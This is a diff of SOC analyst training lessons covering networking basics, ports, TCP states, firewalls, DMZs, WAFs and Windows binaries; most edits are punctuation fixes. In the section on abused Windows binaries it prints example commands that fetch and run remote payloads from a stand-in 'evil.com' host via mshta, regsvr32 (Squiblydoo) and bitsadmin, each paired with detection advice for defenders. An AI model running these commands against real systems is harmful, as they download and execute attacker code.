@@ -89,7 +89,7 @@ Now, layer by layer, from the bottom up.
 | ICMP (Internet Control Message Protocol) | Error and diagnostic messages; powers ping and traceroute | ICMP tunneling smuggles data inside ping packets |
 | IGMP (Internet Group Management Protocol) | Manages multicast group membership | Rare in SOC work, but seen on some LANs |
 | IPsec (AH / ESP) | Encrypts and authenticates IP packets (VPNs) | The basis of many site-to-site VPN tunnels |
-| OSPF / BGP / EIGRP / RIP | Routing protocols. How routers learn paths | BGP hijacking reroutes internet traffic through an attacker |
+| OSPF / BGP / EIGRP / RIP | Routing protocols: how routers learn paths | BGP hijacking reroutes internet traffic through an attacker |
 
 - **SOC relevance:** Layer 3 is where you answer "internal or external?" (private vs public IP) and "where in the world is this?" (geolocation). Attacks include IP spoofing (forging the source IP) and BGP hijacking (announcing routes you do not own to pull traffic toward you).
 
@@ -131,7 +131,7 @@ Ports are split into three ranges by IANA (Internet Assigned Numbers Authority):
 
 | Protocol | Port(s) | Transport | Purpose | SOC relevance |
 |----------|---------|-----------|---------|---------------|
-| HTTP | 80 | TCP | Unencrypted web traffic | Cleartext. Credentials and tokens are readable in transit |
+| HTTP | 80 | TCP | Unencrypted web traffic | Cleartext: credentials and tokens are readable in transit |
 | HTTPS | 443 | TCP | Encrypted web (HTTP over TLS) | Blends C2 into normal web; needs TLS inspection to see inside |
 | DNS | 53 | UDP + TCP | Resolves names to IP addresses | DNS tunneling and DGA; rarely blocked, so heavily abused |
 | SMTP | 25, 587, 465 | TCP | Sending email (25 server-to-server, 587 submission, 465 SMTPS) | Spoofing, open-relay abuse, phishing delivery |
@@ -199,7 +199,7 @@ You'll often see IP addresses written with a slash, like **192.168.1.0/24**. Thi
 
 While IP addresses are logical (they can be reassigned), a **MAC address** (Media Access Control address) is burned into the hardware of a network interface card at the factory. It looks like: **00:1A:2B:3C:4D:5E**
 
-MAC addresses are used for Layer 2 (local network) communication. When your laptop sends data to your home router, it uses the router's MAC address. Routers use IP addresses to get data across the internet, then MAC addresses for the final "last hop" delivery.
+MAC addresses are used for Layer 2 (local network) communication. When your laptop sends data to your home router, it uses the router's MAC address. Routers use IP addresses to get data across the internet, and every single hop on the way uses MAC addresses for its own local delivery.
 
 Attackers sometimes **spoof** (fake) their MAC address to bypass access controls: a technique called MAC spoofing, relevant to NAC (Network Access Control) systems.`,
         checkpoint: {
@@ -226,9 +226,9 @@ At Layer 4 (Transport), two protocols dominate: **TCP** (Transmission Control Pr
 
 TCP is like sending a certified letter with return receipt. Before any data is sent, TCP establishes a connection using a process called the **three-way handshake**:
 
-1. **SYN**, The client sends a "synchronize" packet to the server: "I want to connect."
-2. **SYN-ACK**, The server responds: "Okay, I got your request, I'm ready."
-3. **ACK**, The client confirms: "Great, let's start."
+1. **SYN**: The client sends a "synchronize" packet to the server: "I want to connect."
+2. **SYN-ACK**: The server responds: "Okay, I got your request, I'm ready."
+3. **ACK**: The client confirms: "Great, let's start."
 
 After this handshake, data flows. TCP also guarantees that:
 - Every packet is **acknowledged**, if the receiver doesn't confirm receipt, the sender retransmits
@@ -246,11 +246,11 @@ TCP is used for: web browsing (HTTP/HTTPS), email (SMTP), file transfers (FTP), 
 Opening a connection takes three steps; closing one gracefully takes **four**, because each side must shut down its own direction of the conversation independently (TCP connections are "full-duplex". Data flows both ways at once, so both directions have to be closed one at a time). The flag that signals "I am finished sending" is **FIN** (short for "finish"):
 
 1. **FIN**: Side A says "I have no more data to send."
-2. **ACK**, Side B acknowledges: "Understood."
+2. **ACK**: Side B acknowledges: "Understood."
 3. **FIN**: Side B, when it is also done, says "I have no more data either."
 4. **ACK**: Side A acknowledges, and the connection closes.
 
-There is also an abrupt way to end a connection: the **RST** flag (reset). Instead of the polite four-step goodbye, RST slams the connection shut immediately. Used when something is wrong, when a port is closed, or when a firewall forcibly drops a session. Seeing a burst of RSTs can itself be a signal (for example, a closed-port response during a port scan).
+There is also an abrupt way to end a connection: the **RST** flag (reset). Instead of the polite four-step goodbye, RST slams the connection shut immediately, used when something is wrong, when a port is closed, or when a firewall forcibly drops a session. Seeing a burst of RSTs can itself be a signal (for example, a closed-port response during a port scan).
 
 **TCP Connection States: the words you will see in logs**
 
@@ -288,18 +288,18 @@ Imagine a large apartment building (your computer). The building has one address
 
 **Critical ports every SOC analyst must memorize:**
 
-- **Port 20/21**, FTP (File Transfer Protocol), unencrypted file transfer
-- **Port 22**, SSH (Secure Shell), encrypted remote access
-- **Port 23**, Telnet, unencrypted remote access (never use this!)
-- **Port 25**, SMTP (Simple Mail Transfer Protocol), email sending
-- **Port 53**, DNS (Domain Name System), name resolution
-- **Port 80**, HTTP, unencrypted web traffic
-- **Port 110**, POP3, email retrieval
-- **Port 143**, IMAP, email retrieval
-- **Port 389**, LDAP, Active Directory directory services
-- **Port 443**, HTTPS, encrypted web traffic
-- **Port 445**, SMB, Windows file sharing (very frequently attacked!)
-- **Port 3389**, RDP (Remote Desktop Protocol), Windows remote desktop
+- **Port 20/21**: FTP (File Transfer Protocol), unencrypted file transfer
+- **Port 22**: SSH (Secure Shell), encrypted remote access
+- **Port 23**: Telnet, unencrypted remote access (never use this!)
+- **Port 25**: SMTP (Simple Mail Transfer Protocol), email sending
+- **Port 53**: DNS (Domain Name System), name resolution
+- **Port 80**: HTTP, unencrypted web traffic
+- **Port 110**: POP3, email retrieval
+- **Port 143**: IMAP, email retrieval
+- **Port 389**: LDAP, Active Directory directory services
+- **Port 443**: HTTPS, encrypted web traffic
+- **Port 445**: SMB, Windows file sharing (very frequently attacked!)
+- **Port 3389**: RDP (Remote Desktop Protocol), Windows remote desktop
 - **Port 8080 / 8443**: Alternative web ports, often used by proxies or web apps
 
 **Why Ports Matter for SOC Analysts**
@@ -556,7 +556,7 @@ Think of HTTP like sending a postcard. Anyone who handles the mail can read ever
 3. HTTP request methods include: GET (retrieve something), POST (send data, like a login form), PUT (update), DELETE (remove)
 4. HTTP status codes tell you what happened: 200 = OK, 301 = Redirect, 403 = Forbidden, 404 = Not Found, 500 = Server Error
 
-HTTP runs on **port 80**. The problem: everything is sent as plain text. Passwords, credit card numbers, session tokens. All readable by anyone on the network who can capture traffic (called a **man-in-the-middle attack**).
+HTTP runs on **port 80**. The problem: everything is sent as plain text. Passwords, credit card numbers, session tokens: all readable by anyone on the network who can capture traffic (called a **man-in-the-middle attack**).
 
 **HTTPS: Adding Encryption via TLS**
 
@@ -710,11 +710,11 @@ Email uses multiple protocols for different stages of delivery:
 
 - **SMTP** (Simple Mail Transfer Protocol), port 25 (server-to-server) or port 587 (client submission): Used to *send* email. Your email client sends outgoing mail to your mail server via SMTP, and mail servers use SMTP to pass email to each other across the internet.
 - **POP3** (Post Office Protocol 3), port 110 (or 995 for SSL): Downloads email from server to your device and deletes from server. Old-fashioned.
-- **IMAP** (Internet Message Access Protocol). Port 143 (or 993 for SSL): Syncs email across multiple devices, email stays on server. Modern standard.
+- **IMAP** (Internet Message Access Protocol), port 143 (or 993 for SSL): Syncs email across multiple devices, email stays on server. Modern standard.
 
 Email attacks at the protocol level:
-- **Open SMTP relay:** A mail server that allows anyone to send mail through it. Abused massively for spam and phishing
-- **SMTP spoofing:** Forging the sender address in email headers. Why your CEO's "urgent wire transfer" email should always be verified by phone
+- **Open SMTP relay:** A mail server that allows anyone to send mail through it, abused massively for spam and phishing
+- **SMTP spoofing:** Forging the sender address in email headers, which is why your CEO's "urgent wire transfer" email should always be verified by phone
 
 **ICMP: Ping and Its Abuses**
 
@@ -959,7 +959,7 @@ These questions form the foundation of network-based threat investigation.`,
 
 Imagine a nightclub. Outside, there's a bouncer with a guest list. Your job is to decide who gets in and who doesn't. You check IDs, you check the list, and sometimes you check the dress code. That's exactly what a firewall does for a network.
 
-A **firewall** is a system (hardware, software, or both) that monitors and controls network traffic based on a set of **rules**. Traffic that matches an "allow" rule gets through; traffic that matches a "deny" or "drop" rule is blocked. Traffic that doesn't match any rule hits a **default policy**. Either deny-all (safer) or allow-all (dangerous).
+A **firewall** is a system (hardware, software, or both) that monitors and controls network traffic based on a set of **rules**. Traffic that matches an "allow" rule gets through; traffic that matches a "deny" or "drop" rule is blocked. Traffic that doesn't match any rule hits a **default policy**: either deny-all (safer) or allow-all (dangerous).
 
 Firewalls sit at the boundary between networks: between the internet and your corporate network, between network segments within your company, or even on individual computers (Windows Firewall is a host-based firewall).
 
@@ -1088,7 +1088,7 @@ Both work by comparing traffic against **signatures** (patterns matching known a
 
 The **DMZ** (Demilitarized Zone) is a network architecture concept borrowed from military terminology. In military usage, a DMZ is a buffer zone between two opposing forces where neither side deploys combat forces.
 
-In networking, a DMZ is a **separate network segment** that sits between the internet and the internal corporate network. Servers that need to be accessible from the internet (web servers, email servers, VPN gateways) live in the DMZ. Exposed to the internet but isolated from the sensitive internal network.
+In networking, a DMZ is a **separate network segment** that sits between the internet and the internal corporate network. Servers that need to be accessible from the internet (web servers, email servers, VPN gateways) live in the DMZ, exposed to the internet but isolated from the sensitive internal network.
 
 **Why a DMZ?**
 
@@ -1141,7 +1141,7 @@ A regular network firewall operates at Layers 3-4 (IP/port). A **WAF** (Web Appl
 - Network firewall: "Is this traffic allowed based on IP and port?"
 - WAF: "Is this HTTP request safe? Does it contain SQL injection? XSS? Suspicious patterns?"
 
-WAFs sit in front of web applications. Either inline (blocking mode) or out-of-band (detection mode). Cloud WAFs like AWS WAF, Cloudflare WAF, and Azure Application Gateway WAF are common in modern architectures.`,
+WAFs sit in front of web applications, either inline (blocking mode) or out-of-band (detection mode). Cloud WAFs like AWS WAF, Cloudflare WAF, and Azure Application Gateway WAF are common in modern architectures.`,
         checkpoint: {
           question: "A sensor receives its traffic from a SPAN port, as a copy. When it matches an attack signature, what can it do?",
           options: [
@@ -1394,7 +1394,7 @@ The most important directory on a Windows system. Contains core OS files: the Wi
 
 Note one important exception: **explorer.exe** (Windows Explorer, the graphical shell) does NOT live in System32, the genuine binary is **C:\\Windows\\explorer.exe**, one level up.
 
-**Security note:** Malware frequently disguises itself by using names similar to legitimate system files. "svch0st.exe" (zero instead of 'o'), "1sass.exe" (one instead of 'l'), or placing malicious copies of legitimate file names in other directories like %TEMP%.
+**Security note:** Malware frequently disguises itself by using names similar to legitimate system files: "svch0st.exe" (zero instead of 'o'), "1sass.exe" (one instead of 'l'), or placing malicious copies of legitimate file names in other directories like %TEMP%.
 
 **C:\\Windows\\SysWOW64\\**
 Contains 32-bit versions of system files on 64-bit Windows. The naming is counterintuitive but important: SysWOW64 = 32-bit, System32 = 64-bit (for historical reasons). Malware targeting 32-bit compatibility often runs from here.
@@ -1644,11 +1644,11 @@ IEX (Invoke-Expression) executes a string as code. This downloads a script from 
 - **mshta.exe:** Runs HTA (HTML Application) files. Attackers use it to execute malicious HTML/JScript/VBScript (mshta http://evil.com/payload.hta)
 - **rundll32.exe:** Loads and runs DLL files. Legitimate use: Windows internal. Attacker use: execute malicious DLLs, call COM objects
 - **regsvr32.exe:** Registers and unregisters COM DLLs (it writes/removes their registry entries). Installers and admins use it legitimately, usually against a local DLL path such as regsvr32 /s C:\\Program Files\\Vendor\\component.dll.
-  - **How it is abused (MITRE ATT&CK T1218.010. System Binary Proxy Execution: Regsvr32):** the "Squiblydoo" technique, regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll. The /i: switch hands a URL to scrobj.dll, which fetches a remote scriptlet (.sct) and runs its embedded JScript/VBScript in memory. Nothing is actually registered, no admin rights are needed, the binary is Microsoft-signed, and it historically bypassed AppLocker script rules, which is why it is popular for initial execution.
-  - **What to look for:** a process-creation event (Sysmon Event ID 1 or Windows 4688) for regsvr32.exe whose command line contains /i: with http(s):// or a UNC path, or references scrobj.dll; an unusual parent (winword.exe, excel.exe, outlook.exe, wscript.exe, mshta.exe); regsvr32 making an outbound network connection (Sysmon Event ID 3). Legitimate registration never needs the internet; and child processes spawned by regsvr32 (cmd.exe, powershell.exe). Any of these deserves escalation.
+  - **How it is abused (MITRE ATT&CK T1218.010, System Binary Proxy Execution: Regsvr32):** the "Squiblydoo" technique, regsvr32 /s /n /u /i:http://evil.com/payload.sct scrobj.dll. The /i: switch hands a URL to scrobj.dll, which fetches a remote scriptlet (.sct) and runs its embedded JScript/VBScript in memory. Nothing is actually registered, no admin rights are needed, the binary is Microsoft-signed, and it historically bypassed AppLocker script rules, which is why it is popular for initial execution.
+  - **What to look for:** a process-creation event (Sysmon Event ID 1 or Windows 4688) for regsvr32.exe whose command line contains /i: with http(s):// or a UNC path, or references scrobj.dll; an unusual parent (winword.exe, excel.exe, outlook.exe, wscript.exe, mshta.exe); regsvr32 making an outbound network connection (Sysmon Event ID 3), since legitimate registration never needs the internet; and child processes spawned by regsvr32 (cmd.exe, powershell.exe). Any of these deserves escalation.
 - **wscript.exe / cscript.exe:** Runs VBScript and JScript files. Frequently used to run malicious scripts delivered via email
 - **bitsadmin.exe:** Command-line manager for BITS (Background Intelligent Transfer Service): the Windows service that downloads/uploads files in the background using idle bandwidth. Windows Update and many software updaters rely on BITS; bitsadmin itself is deprecated in favour of PowerShell's BITS cmdlets but still ships with Windows.
-  - **How it is abused (MITRE ATT&CK T1197. BITS Jobs):** downloading tools or payloads (for example bitsadmin /transfer job /download /priority high http://evil.com/a.exe C:\\Users\\Public\\a.exe), because the traffic comes from the trusted BITS service (svchost.exe) rather than from the attacker's process, often looks like normal update traffic, and resumes automatically after reboots or network drops. BITS jobs are also used for **persistence**: a job's notify command (bitsadmin /SetNotifyCmdLine) runs a program when the job completes or fails, and jobs survive reboots, so malware can be re-launched without a Run key or scheduled task.
+  - **How it is abused (MITRE ATT&CK T1197: BITS Jobs):** downloading tools or payloads (for example bitsadmin /transfer job /download /priority high http://evil.com/a.exe C:\\Users\\Public\\a.exe), because the traffic comes from the trusted BITS service (svchost.exe) rather than from the attacker's process, often looks like normal update traffic, and resumes automatically after reboots or network drops. BITS jobs are also used for **persistence**: a job's notify command (bitsadmin /SetNotifyCmdLine) runs a program when the job completes or fails, and jobs survive reboots, so malware can be re-launched without a Run key or scheduled task.
   - **What to look for:** process-creation events (Sysmon ID 1 / 4688) for bitsadmin.exe with /transfer, /addfile, /SetNotifyCmdLine or /resume, especially launched by Office, scripts or a user shell; the Microsoft-Windows-Bits-Client/Operational log, Event ID 3 (job created), 59 (transfer started, includes the URL) and 60 (transfer stopped), with downloads from IP addresses, newly registered domains or file-sharing sites; files written to user-writable paths (C:\\Users\\Public, %TEMP%) that are then executed; and long-lived or unfamiliar jobs listed by bitsadmin /list /allusers /verbose during an investigation.
 - **msiexec.exe:** Installs MSI packages. Attacker use: install malicious packages, load DLLs
 - **wmic.exe:** Windows Management Instrumentation command line. Extremely powerful: can query system information, execute commands, move laterally
@@ -1764,7 +1764,7 @@ This is exactly why the indicators from the previous reading matter as much as t
           hostname: "CORP-WS-0203",
           user_email: "jdoe@company.com",
           description:
-            "Microsoft Word spawned PowerShell with Base64-encoded command. Likely malicious Office macro executing payload",
+            "Microsoft Word spawned PowerShell with Base64-encoded command: likely malicious Office macro executing payload",
           mitre_technique: "T1059.001 - Command and Scripting Interpreter: PowerShell",
           process: {
             name: "powershell.exe",
